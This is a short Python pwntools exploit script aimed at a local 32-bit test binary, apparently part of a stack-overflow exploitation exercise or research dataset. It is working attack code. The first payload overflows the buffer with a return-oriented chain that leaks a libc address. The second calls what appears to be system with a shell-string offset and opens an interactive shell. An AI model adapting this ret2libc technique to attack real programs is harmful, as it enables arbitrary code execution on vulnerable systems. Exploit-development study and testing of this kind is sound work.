from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/32bit/stack_overflow/dynamic/test4/dynamic_test4")
pwn.gdb.attach(p)
p.recvuntil(b'hello world\n')
payload = b"\x00" * 28
payload += p32(0x8048390) + p32(0x804861b) + p32(0x8049fe8) + p32(0x8048380) + p32(0x8048619) + p32(0x0) + p32(0x804a880) + p32(0xc) + p32(0x804861b) + p32(0x804a87c) + p32(0x8048455)
payload = payload.ljust(256, b"a")
p.send(payload)
libc_base = u32(p.recv()[0:4].ljust(4,b'\x00')) + -0x18eb0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p32(libc_base + 0x3d3d0) + p32(0x0) + p32(libc_base + 0x17e1db)
p.send(payload)
p.interactive()
